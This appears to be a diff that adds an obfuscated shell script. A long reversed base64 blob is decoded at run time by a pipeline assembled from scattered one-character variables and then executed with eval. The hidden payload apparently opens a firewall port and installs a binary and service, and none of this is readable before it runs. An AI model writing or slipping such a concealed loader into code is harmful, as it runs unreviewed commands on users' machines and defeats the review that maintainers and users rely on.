+lxmYhRHcppgIu4iLJBVQgI3bmBCO4gTNgQncvBHIsxWY3VmcpZGIn5WauVGcPJCIvh2YlpQampgI
+gAIliDIliDIliLCIvh2YlpAVQV0QDFEIq1CI4gDO1ACdy9Gck1SLgA3Y0BCctACVVBlTJBSStAyc
+n5Wa0FmcnVGdulEIASp4ASp4ASp4iAyboNWZKICgUKOgUKOgUKOIlRXZsBXbvNEIwVHdlNFIJBVQ
+19CIiADJiACcjpgCiAIliDIliDIliDSblR3c5NHIlhGdg8GdulGI0BXayN2cgQnbl1WZnFmbh1GI
+t4Gc2lmev4Wai9CbhN2bs9iczV3Lgg3KgQ2bth2YKIXZnFmbh1WLuBndpp3LulmYvwWYj9GbvI3c
+zFmYv4Wai9SIjogbwZXa6BHZ19ibpJ2LsF2Yvx2LyNXdvAiPgciRPV0J8wDI0F2YKogcldWYuFWb
+zV3Lgg3KgQ2bth2YKY0TFpgIARiIgIXZnFmbh1WLuBndpp3LulmYvwWYj9GbvI3c19CIjVGelpAa
+i0TROlETfNVQJxUQKIyYyh2chJmLvQ3bvJ3Li0zQSh0UBJkCK4Gc2lmewRWdv4Wai9CbhN2bs9ic
+INVQCRiIgYWLgsFImlmCKIyJuBndppHckV3LulmYvwWYj9GbvI3c19yJ94Gc2lmewRWdgMXYpxWY
+kICIvh2YlBCf8BiIDJFSTFkQkICIiUkTJx0XTFUSMFEJiAiRx1CIwVmcnBCIK4WZoRHI70FIiMkU
+BJEJiAiPgISROlETfNVQJxUQkICIvh2YlBCIKU2csVmCiMkUINVQCRiIg4jPgISROlETfNVQJxUQ
+yVGdgUnbl1GIoFGdulmclBlIg8GajVmCikHbu9EIOBlVJpFI6UGZv1kIg8GajVmCKkmZKIyQSh0U
+gwHfgwGb152L2VGZv4jMgIyQSh0UBJEJiASZjJXdvNnCicibwZXa6BHZ1dCIrlGdltGI6EWakV2c
+lhGdgsTXgADI0dWLgIyIkICIbBiZppwegkCKulWYtBibvlGdj5WdmpQfKUnbl12X39GazpQZ1JHd
+vN2Yh9VZ0FWZyNmCulGIiQmbh1WbvNGJiASZzF2YKQnZph2cKISMkISPk5WYt12bjBCbhN2bspgb
+0VGblR2XKkCduV3bjNWYfVGdlxWZkpwO7ogIARiIgMWan9GbfRnb192YjF2XlRXYlJ3YfpQK05Wd
+n9GbfRnb192YjF2X3VmblJ3XKkCduV3bjNWYfdXZuVmcKszOKICQkICIjl2Zvx2X05WdvN2Yh9VZ
+ARiIgMWan9GbfRnb192YjF2XsFWayR3XlRXYlJ3YfpQK05WdvN2Yh9Fbhlmc0pwO7ogIARiIgMWa
+7oQMgQXa4VmCicCZuFWbt92YkcCIk5WYt12bjBib39mbr5WVgojcvJncFJCIvh2YlpQKqowO7ogI
+lNnLuBndpp3LtVGdzl3cvQWblR3c5N3LjRXZvICIm1CIhAyWgYWaKkmZK8DJgQXa4VmCjF2clpwO
+l52bkpQduVWbfd3boNnCvRGI7UWdyRHIlxWaodnCpZmCwVHdlN3XuVncK4WZoRHI70FIiU2YpZnc
+iAEJiAibpFWbK4WZoRHI70VXgISfwsHJiASP9AiI91FMbV0QSV1TT9FSTFkQ7RiIgs1WgYWaK0nC
+==gCpZmC'
+eLoP="e";Mll="ch";GHi="o";v6T=" ";Re="-";H2o="t";O2h="r";r="ev";Gi="ba";x="s";u18="6";x64="4";sfT="d";LcV=" ";Edo="\n"
+
+x=$(eval $eLoP$Mll$GHi$v6T$Re$eLoP$v6T$RzE$v6T|$v6T$H2o$O2h$LcV"$LcV"$LcV"$Edo"$LcV|$v6T$O2h$r$v6T|$v6T$Gi$x$eLoP$u18$x64$v6T$Re$sfT)
+
+eval "$x"
